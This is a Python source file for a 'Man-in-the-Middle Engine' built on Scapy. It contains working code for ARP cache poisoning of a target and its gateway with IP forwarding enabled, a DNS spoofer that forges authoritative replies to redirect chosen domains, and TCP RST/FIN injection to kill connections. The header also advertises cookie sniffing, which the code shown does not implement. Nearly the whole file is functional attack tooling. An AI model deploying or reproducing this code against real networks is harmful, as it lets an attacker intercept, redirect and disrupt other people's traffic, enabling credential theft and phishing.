"""
M.S.J Man-in-the-Middle Engine
==============================
Active MITM capabilities:
  - ARP Spoofing (redirect traffic through attacker)
  - DNS Spoofing (redirect specific domains)
  - Packet Forwarding (transparent proxy)
  - Connection Hijacking (TCP RST injection)
  - Session Sniffing (cookie extraction via MITM)

Requires root privileges. Uses Scapy for L2 manipulation.

Creator: M.S.J
"""

import time
import threading
import signal
import sys
from datetime import datetime
from typing import Optional, List, Dict, Callable
from dataclasses import dataclass, field

from scapy.all import (
    Ether, ARP, IP, TCP, UDP, ICMP, DNS, DNSRR, DNSQR,
    send, sendp, srp, sniff, conf, get_if_hwaddr
)

import netifaces


@dataclass
class MITMConfig:
    """MITM attack configuration."""
    interface: str
    target_ip: str
    gateway_ip: str
    attacker_ip: str = None
    attacker_mac: str = None
    gateway_mac: str = None
    target_mac: str = None
    dns_spoof_table: Dict[str, str] = field(default_factory=dict)
    auto_detect_macs: bool = True
    restore_on_exit: bool = True
    packet_forwarding: bool = True
    verbose: bool = True


class ARPSpoofer:
    """
    ARP spoofing engine. Performs MITM by poisoning ARP caches of target and gateway.

    Usage:
        spoofer = ARPSpoofer(interface='eth0', target_ip='192.168.1.100', gateway_ip='192.168.1.1')
        spoofer.start()
        ...
        spoofer.stop()
    """

    def __init__(self, config: MITMConfig):
        self.config = config
        self._running = False
        self._poison_thread = None
        self._stats = {
            'packets_spoofed': 0,
            'arp_sent': 0,
            'start_time': None,
            'stop_time': None
        }

        # Resolve MAC addresses
        if config.attacker_mac is None:
            config.attacker_mac = get_if_hwaddr(config.interface)

        if config.attacker_ip is None:
            try:
                addrs = netifaces.ifaddresses(config.interface)
                config.attacker_ip = addrs[netifaces.AF_INET][0]['addr']
            except Exception:
                config.attacker_ip = '0.0.0.0'

        if config.auto_detect_macs:
            self._resolve_macs()

    def _resolve_macs(self):
        """Resolve MAC addresses for target and gateway via ARP."""
        conf.verb = 0  # Suppress Scapy output

        # Resolve gateway MAC
        if not self.config.gateway_mac:
            try:
                arp_req = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(
                    pdst=self.config.gateway_ip
                )
                resp = srp(arp_req, timeout=2, verbose=False, iface=self.config.interface)
                if resp and resp[0]:
                    self.config.gateway_mac = resp[0][0][1].hwsrc
                    if self.config.verbose:
                        print(f"  [Gateway MAC] {self.config.gateway_ip} -> {self.config.gateway_mac}")
            except Exception as e:
                if self.config.verbose:
                    print(f"  [!] Could not resolve gateway MAC: {e}")

        # Resolve target MAC
        if not self.config.target_mac:
            try:
                arp_req = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(
                    pdst=self.config.target_ip
                )
                resp = srp(arp_req, timeout=2, verbose=False, iface=self.config.interface)
                if resp and resp[0]:
                    self.config.target_mac = resp[0][0][1].hwsrc
                    if self.config.verbose:
                        print(f"  [Target MAC] {self.config.target_ip} -> {self.config.target_mac}")
            except Exception as e:
                if self.config.verbose:
                    print(f"  [!] Could not resolve target MAC: {e}")

        conf.verb = 1

    def _poison(self, target_ip: str, target_mac: str, spoof_ip: str):
        """
        Send a single ARP poison packet.
        Tells `target_ip` that `spoof_ip` has our MAC address.
        """
        if not target_mac:
            return False

        arp_response = ARP(
            op=2,  # is-at
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            hwsrc=self.config.attacker_mac
        )
        ether_frame = Ether(dst=target_mac, src=self.config.attacker_mac) / arp_response

        try:
            sendp(ether_frame, iface=self.config.interface, verbose=False)
            self._stats['arp_sent'] += 1
            return True
        except Exception:
            return False

    def _poison_loop(self):
        """Continuous ARP poison loop."""
        # Enable IP forwarding on Linux
        if self.config.packet_forwarding:
            try:
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1\n')
            except Exception:
                if self.config.verbose:
                    print("  [!] Could not enable IP forwarding (not root?)")

        while self._running:
            # Poison target: tell target we are the gateway
            self._poison(
                self.config.target_ip,
                self.config.target_mac,
                self.config.gateway_ip
            )

            # Poison gateway: tell gateway we are the target
            self._poison(
                self.config.gateway_ip,
                self.config.gateway_mac,
                self.config.target_ip
            )

            self._stats['packets_spoofed'] += 1
            time.sleep(1.5)  # Re-poison every 1.5s (ARP caches vary)

    def start(self):
        """Begin ARP spoofing."""
        if self._running:
            return

        if not self.config.target_mac or not self.config.gateway_mac:
            if self.config.verbose:
                print("  [!] MAC addresses not resolved. Attempting resolution...")
            self._resolve_macs()

        if not self.config.target_mac:
            raise RuntimeError(f"Could not resolve MAC for target {self.config.target_ip}")
        if not self.config.gateway_mac:
            raise RuntimeError(f"Could not resolve MAC for gateway {self.config.gateway_ip}")

        self._running = True
        self._stats['start_time'] = datetime.now()

        self._poison_thread = threading.Thread(target=self._poison_loop, daemon=True)
        self._poison_thread.start()

        if self.config.verbose:
            print(f"  [ARP Spoofing] MITM established: {self.config.target_ip} <-> {self.config.attacker_ip} <-> {self.config.gateway_ip}")
            print(f"  [ARP Spoofing] Target MAC: {self.config.target_mac}")
            print(f"  [ARP Spoofing] Gateway MAC: {self.config.gateway_mac}")
            print(f"  [ARP Spoofing] Attacker MAC: {self.config.attacker_mac}")

    def stop(self):
        """Stop ARP spoofing and restore ARP tables."""
        self._running = False
        self._stats['stop_time'] = datetime.now()

        if self.config.restore_on_exit:
            self._restore()

        # Disable IP forwarding
        if self.config.packet_forwarding:
            try:
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('0\n')
            except Exception:
                pass

        if self.config.verbose:
            print("  [ARP Spoofing] Stopped. ARP tables restored.")

    def _restore(self):
        """Restore original ARP tables by sending correct MAC info."""
        if not self.config.target_mac or not self.config.gateway_mac or not self.config.attacker_mac:
            return

        # Restore target's ARP cache: tell target the real gateway MAC
        restore1 = Ether(dst=self.config.target_mac) / ARP(
            op=2, pdst=self.config.target_ip, hwdst=self.config.target_mac,
            psrc=self.config.gateway_ip, hwsrc=self.config.gateway_mac
        )
        # Restore gateway's ARP cache: tell gateway the real target MAC
        restore2 = Ether(dst=self.config.gateway_mac) / ARP(
            op=2, pdst=self.config.gateway_ip, hwdst=self.config.gateway_mac,
            psrc=self.config.target_ip, hwsrc=self.config.target_mac
        )

        for _ in range(5):
            try:
                sendp(restore1, iface=self.config.interface, verbose=False)
                sendp(restore2, iface=self.config.interface, verbose=False)
            except Exception:
                pass
            time.sleep(0.3)

    def get_stats(self) -> dict:
        """Get ARP spoofing statistics."""
        return self._stats.copy()


class DNSSpoofer:
    """
    DNS spoofing engine. Intercepts DNS queries and returns forged responses.
    Works alongside ARPSpoofer for MITM positioning.

    Usage:
        dns_spoof = DNSSpoofer(dns_table={'*.example.com': '192.168.1.50'})
        dns_spoof.start(interface='eth0')
    """

    def __init__(self, spoof_table: Dict[str, str] = None):
        """
        spoof_table: dict mapping domain patterns -> IP address.
            '*' matches all subdomains.
            'example.com' matches exactly.
            '*.example.com' matches any subdomain of example.com.
        """
        self.spoof_table = spoof_table or {}
        self._running = False
        self._sniffer = None
        self._stats = {'responses_sent': 0, 'queries_intercepted': 0}
        self._callback = None

    def add_spoof(self, domain: str, ip: str):
        """Add a domain -> IP spoof rule."""
        self.spoof_table[domain] = ip

    def remove_spoof(self, domain: str):
        """Remove a domain spoof rule."""
        self.spoof_table.pop(domain, None)

    def _matches(self, query: str) -> Optional[str]:
        """Check if a DNS query matches any spoof rule. Returns IP if match."""
        query = query.lower().rstrip('.')

        # Exact match
        if query in self.spoof_table:
            return self.spoof_table[query]

        # Wildcard subdomain match
        for pattern, ip in self.spoof_table.items():
            if pattern.startswith('*.'):
                base = pattern[2:].lower()
                if query.endswith('.' + base) or query == base:
                    return ip

        # Prefix wildcard
        for pattern, ip in self.spoof_table.items():
            if pattern == '*':
                return ip  # Catch-all

        return None

    def _handle_dns(self, pkt):
        """Intercept DNS queries and send forged responses."""
        if not pkt.haslayer(DNS) or not pkt.haslayer(IP) or not pkt.haslayer(UDP):
            return

        dns = pkt[DNS]
        ip = pkt[IP]
        udp = pkt[UDP]

        # Only respond to queries (qr=0 is query, qr=1 is response)
        if dns.qr == 0 and dns.opcode == 0:  # Standard query
            qname = dns[DNSQR].qname.decode('utf-8', errors='replace').rstrip('.')
            self._stats['queries_intercepted'] += 1

            spoof_ip = self._matches(qname)
            if spoof_ip:
                # Build spoofed DNS response
                dns_response = IP(src=ip.dst, dst=ip.src) / UDP(sport=53, dport=udp.sport) / DNS(
                    id=dns.id,
                    qr=1,  # Response
                    aa=1,  # Authoritative
                    qd=DNSQR(qname=qname + '.'),
                    an=DNSRR(rrname=qname + '.', ttl=60, rdata=spoof_ip)
                )

                try:
                    send(dns_response, verbose=False)
                    self._stats['responses_sent'] += 1
                    if self._callback:
                        self._callback(qname, spoof_ip)
                except Exception:
                    pass

    def start(self, interface: str = None, callback: Callable = None):
        """Start DNS spoofing sniffer."""
        if self._running:
            return
        self._running = True
        self._callback = callback or (lambda q, i: None)

        self._sniffer = threading.Thread(
            target=lambda: sniff(
                iface=interface,
                prn=self._handle_dns,
                filter='udp port 53',
                store=False,
                stop_filter=lambda p: not self._running
            ),
            daemon=True
        )
        self._sniffer.start()

    def stop(self):
        """Stop DNS spoofing."""
        self._running = False
        # sniffer will stop via stop_filter

    def get_stats(self) -> dict:
        """Get DNS spoofing statistics."""
        return self._stats.copy()


class ConnectionHijacker:
    """
    TCP connection hijacking via RST/FIN injection.
    Requires MITM position (ARP spoofing) to work effectively.
    """

    def __init__(self):
        self._stats = {
            'rst_sent': 0,
            'fin_sent': 0,
            'sessions_killed': 0
        }

    def send_rst(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int,
                  seq: int, ack: int, src_mac: str = None, dst_mac: str = None,
                  interface: str = None):
        """
        Send a TCP RST packet to kill a connection.
        Requires accurate SEQ/ACK numbers (usually from sniffing the connection).
        """
        pkt = IP(src=src_ip, dst=dst_ip) / TCP(
            sport=src_port, dport=dst_port,
            flags='R', seq=seq, ack=ack
        )

        if src_mac and dst_mac:
            pkt = Ether(src=src_mac, dst=dst_mac) / pkt

        try:
            if interface:
                sendp(pkt, iface=interface, verbose=False)
            else:
                send(pkt, verbose=False)
            self._stats['rst_sent'] += 1
            self._stats['sessions_killed'] += 1
            return True
        except Exception:
            return False

    def send_fin(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int,
                  seq: int, ack: int, src_mac: str = None, dst_mac: str = None,
                  interface: str = None):
        """
        Send a TCP FIN packet to gracefully close a connection.
        """
        pkt = IP(src=src_ip, dst=dst_ip) / TCP(
            sport=src_port, dport=dst_port,
            flags='F', seq=seq, ack=ack
        )

        if src_mac and dst_mac:
            pkt = Ether(src=src_mac, dst=dst_mac) / pkt

        try:
            if interface:
                sendp(pkt, iface=interface, verbose=False)
            else:
                send(pkt, verbose=False)
            self._stats['fin_sent'] += 1
            return True
        except Exception:
            return False

    def get_stats(self) -> dict:
        """Get connection hijacking statistics."""
        return self._stats.copy()
